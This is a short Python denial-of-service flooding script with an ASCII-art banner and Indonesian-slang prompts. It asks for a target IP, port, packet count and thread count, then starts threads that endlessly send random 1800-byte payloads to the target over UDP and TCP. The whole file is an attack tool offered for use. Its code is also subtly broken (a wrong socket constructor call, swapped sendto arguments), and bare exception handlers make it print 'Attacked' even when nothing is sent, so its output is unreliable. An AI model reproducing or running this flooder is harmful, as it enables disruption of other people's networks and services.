import random
import socket
import threading
import time
import sys,os

print("""\033[91m
█░█░█ █ ▀█ ▀█ █▀ █▀▀ █▀▀
▀▄▀▄▀ █ █▄ █▄ ▄█ ██▄ █▄▄
""")

ip = str(input("IP DEK > "))
port = int(input("PORT DEK > "))
choice = str(input("(y) > "))
times = int(input("PAKETS NYA DEK > "))
threads = int(input("THREADS NYA DEK > "))
os.system('clear')
def run():
  data = random._urandom(1800)
  while True:
    try:
      s = socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(addr,data)
        print(f"Attacked Ip Port {ip}:{port}")
    except:
      print(f"Attacked Ip Port {ip}:{port}")

def run1():
  data = random._urandom(1800)
  while True:
    try:
      s = socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"Attacked Ip Port {ip}:{port}")
    except:
      s.close()
      print(f"Attacked Ip Port {ip}:{port}")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target=run)
    th.start()
    th = threading.Thread(target=run1)
    th.start()
